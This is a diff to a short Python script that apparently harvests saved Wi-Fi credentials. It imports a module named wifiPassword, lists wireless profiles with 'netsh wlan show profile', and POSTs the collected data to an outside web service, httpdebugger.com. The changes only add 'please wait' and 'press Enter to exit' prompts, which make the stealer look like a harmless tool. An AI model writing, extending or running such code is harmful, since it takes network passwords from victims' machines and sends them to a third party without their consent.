@@ -2,6 +2,7 @@ import wifiPassword
 import subprocess
 import requests
 
+print("please wait . . . ")
 command1 = subprocess.getoutput("netsh wlan show profile")
 command2 = (
     command1.replace("Profiles on interface Wi-Fi:", "")
@@ -34,3 +35,4 @@ pocket = {
 }
 req = requests.post("http://httpdebugger.com/Tools/ViewHttpHeaders.aspx", pocket)
 print(req)
+print("press Enter to exit")
